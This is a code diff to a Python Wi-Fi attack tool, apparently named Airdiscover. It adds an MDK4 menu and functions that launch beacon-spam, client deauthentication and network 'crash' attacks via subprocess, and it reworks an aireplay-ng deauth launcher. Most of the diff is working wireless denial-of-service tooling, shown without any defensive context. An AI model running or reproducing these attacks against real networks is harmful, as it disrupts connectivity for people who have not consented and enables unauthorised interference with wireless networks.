@@ -126,7 +126,7 @@ def load_ddos(bss, chh, monitor_num):
     def load_dos():
         print(Fore.BLUE+'[*]'+Fore.RESET+' Starting Deauth Attack, Press CTRL + C To Stop...')
         time.sleep(1)
-        subprocess.run(["airmon-ng", "start", monitor_num, chh])
+        subprocess.run(["xterm", "-T", "Monitor Mode (Airdiscover)", "-e", "airmon-ng", "start", monitor_num, chh])
         subprocess.run(["xterm", "-T", "Deauth Attack (Airdiscover)", "-e", "aireplay-ng", "--deauth", "0", "-a", bss, monitor_num])
     load_dos()
 def ddos_attacks(monitor):
@@ -159,17 +159,18 @@ def monitor_configure():
 
 monitor_configure()
 def config():
-    optional_menu = Fore.LIGHTCYAN_EX+f'''
--------------------{Fore.CYAN}
+    optional_menu = Fore.CYAN+f'''
+-------------------
 Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
 Target BSSID: {BSSID}
-Target ESSID:{ESSID}
-Channel: {CHANNEL}
+Target ESSID: {ESSID}
+On Channel: {CHANNEL}
 Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
 -------------------{Fore.RESET}
 
-0) Exit script{Fore.LIGHTBLUE_EX}
-----------------------------------
+---------
+0) Exit script
+---------{Fore.LIGHTBLUE_EX}
 
 Scan, Interface Options
 ----------------------------------{Fore.RESET}
@@ -180,10 +181,107 @@ Scan, Interface Options
 {Fore.LIGHTBLUE_EX}
 Optional features, attacks ({Fore.RED}MONITOR MODE{Fore.LIGHTBLUE_EX})
 ----------------------------------{Fore.RESET}
-5) Deauth Attack / Aireplay (WPA, WPA2, WEP) ({Fore.LIGHTYELLOW_EX}Aireplay-ng){Fore.RESET}
+5) Aireplay Deauth Attack ({Fore.LIGHTGREEN_EX}Aireplay-ng{Fore.RESET})
+6) MDK / MDK3 / MDK4 Deauth Attacks
 '''
     return optional_menu
 
+def config_mdk():
+    mdk_menu = Fore.CYAN+f'''
+-------------------
+Interface: {Fore.GREEN}{INTERFACE}{Fore.CYAN}
+Target BSSID: {BSSID}
+Target ESSID: {ESSID}
+On Channel: {CHANNEL}
+Target Encryption: WPA, WPA2, WEP{Fore.LIGHTBLUE_EX}
+-------------------{Fore.RESET}
+
+---------
+0) Go Back
+---------{Fore.LIGHTBLUE_EX}
+
+MDK Attacks, features, ({Fore.LIGHTGREEN_EX}Public/Local{Fore.RESET}){Fore.LIGHTBLUE_EX}
+------------------------------------{Fore.RESET}
+1) Spam AP(s) / MDK4
+2) Deauth Public/Target Network Client(s) / MDK4
+3) Deauth Local Network Client(s) / MDK4 ({Fore.LIGHTGREEN_EX}Local/Doesnt Require Target{Fore.RESET})
+4) Crash Local/Public/Target Network(s) / MDK4 / MDK
+'''
+    return mdk_menu
+
+
+def mdk4_attacks(type):
+    if MONITORED_INTERFACE == "None":
+        print(Fore.RED+'[-]'+Fore.RESET+' You Have No Monitored Interface Selected, Please Perform a Network Scan First!')
+        time.sleep(1)
+    else:
+        pass
+    if type == "spam":
+        print(Fore.BLUE+'[*]'+Fore.RESET+' AP Spam Started, Press CTRL + C To Stop...')
+        subprocess.run(["xterm", "-T", "AP(s) Spam (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "b"])
+    elif type == "client_deauth":
+        print(Fore.BLUE+'[*]'+Fore.RESET+' Client(s) (Public) Deauth Started, Press CTRL + C To Stop...')
+        subprocess.run(["xterm", "-T", "Deauth Public Client(s) (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "a"])
+    elif type == "client_deauth_local":
+        print(Fore.BLUE+'[*]'+Fore.RESET+' Client(s) (Local) Deauth Started, Press CTRL + C To Stop...')
+        subprocess.run(["xterm", "-T", "Deauth Local Client(s) (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "d"])
+    elif type == "crash":
+        print(Fore.BLUE+'[*]'+Fore.RESET+' Crash/Deauth (Public/Local) Started , Press CTRL + C To Stop...')
+        subprocess.run(["xterm", "-T", "Crash/Deauth Local/Public (Airdiscover)", "-e", "mdk4", MONITORED_INTERFACE, "w"])
+
+
+def mdk_attacks_menu():
+    os.system("clear")
+    banners()
+    def clear_print():
+        os.system('clear')
+        banners()
+        print(config_mdk())
+    def bssid_essid_check():
+        if BSSID == "None" or ESSID == "None" or CHANNEL == "None":
+            return False
+        else:
+            return True
+    print(config_mdk())
+    while True:
+        try:
+            selection_attack = int(input("> "))
+        except Exception as menu_error:
+            print(Fore.RED+'[-]'+Fore.RESET+f' Error: {menu_error}')
+            sys.exit()
+        if selection_attack == '':
+            print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
+            time.sleep(0.5)
+            clear_print()
+        elif selection_attack == 0:
+            break
+        elif selection_attack == 1:
+            if bssid_essid_check() == False:
+                print(Fore.RED+'[-]'+Fore.RESET+' No Network Selected!')
+                time.sleep(1)
+                break
+            else:
+                mdk4_attacks("spam")
+        elif selection_attack == 2:
+            if bssid_essid_check() == False:
+                print(Fore.RED+'[-]'+Fore.RESET+' No Network Selected!')
+                time.sleep(1)
+                break
+            else:
+                mdk4_attacks("client_deauth")
+        elif selection_attack == 3:
+            mdk4_attacks("client_deauth_local")
+        elif selection_attack == 4:
+            if bssid_essid_check() == False:
+                print(Fore.RED+'[-]'+Fore.RESET+' No Network Selected!')
+                time.sleep(1)
+                break
+            else:
+                mdk4_attacks("crash")
+        else:
+            print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
+            time.sleep(0.5)
+            clear_print()
 
 
 os.system("clear")
@@ -256,8 +354,8 @@ while True:
                                         active_wireless_networks.append(row)
 
                 print(Fore.BLUE+"[*]"+Fore.RESET+" Scanning... Press Ctrl+C when you want to select\n")
-                print(Fore.GREEN+"No |\tBSSID              |\tChannel|\tESSID                         |")
-                print(Fore.GREEN+"___|\t___________________|\t_______|\t______________________________|")
+                print(Fore.RESET+"No |\tBSSID              |\tChannel|\tESSID                         |")
+                print(Fore.RESET+"___|\t___________________|\t_______|\t______________________________|")
                 for index, item in enumerate(active_wireless_networks):
                     print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                 time.sleep(0.5)
@@ -285,6 +383,9 @@ while True:
         clear_print()
     elif selection_attack == 5:
         ddos_attacks(MONITORED_INTERFACE)
+        clear_print()
+    elif selection_attack == 6:
+        mdk_attacks_menu()
         clear_print()
     else:
         print(Fore.RED+'[-]'+Fore.RESET+' Select a Valid Option!')
